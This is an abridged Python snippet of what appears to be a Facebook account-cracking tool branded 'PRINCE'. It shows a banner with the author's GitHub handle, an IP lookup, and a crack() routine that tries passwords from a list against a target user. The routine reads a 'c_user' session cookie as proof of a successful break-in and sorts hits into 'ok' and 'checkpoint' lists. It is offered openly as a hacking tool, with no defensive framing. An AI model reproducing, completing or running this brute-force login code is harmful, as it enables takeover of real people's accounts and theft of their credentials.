...
[\x1b[1;97m•\33[1;97m] Autor  : PRINCE \n[\x1b[1;97m•\33[1;97m] Github : Prince162\x1b[1;97m\n---------------------------------------------------------------------""")
        
 
		IP = requests.get('https://api.ipify.org').text
		print('          %s[ %sWelcome To PRINCE Tool %s%s ]\n'%(N,O,N,O))
	...
	def crack(self, user, password_list, url):
		...
		for pw in password_list:
			...
			if "c_user" in session.cookies.get_dict():
				print('\r%s[PRINCE-BRAND-HACK-SUCESSFULL❤] %s • %s •'%(H,user,pw))
				ok.append(user+"|"+pw)
				...
				print('\r%s[PRINCE-BRAND-CHECKPOINT] %s • %s •'%(M,user,pw))
				cp.append(user+"|"+pw)
...
class Assets(Main):
	...
	def validate(self):
		...
		exit(
			" [program finished] crack finished, PRINCE"
		)
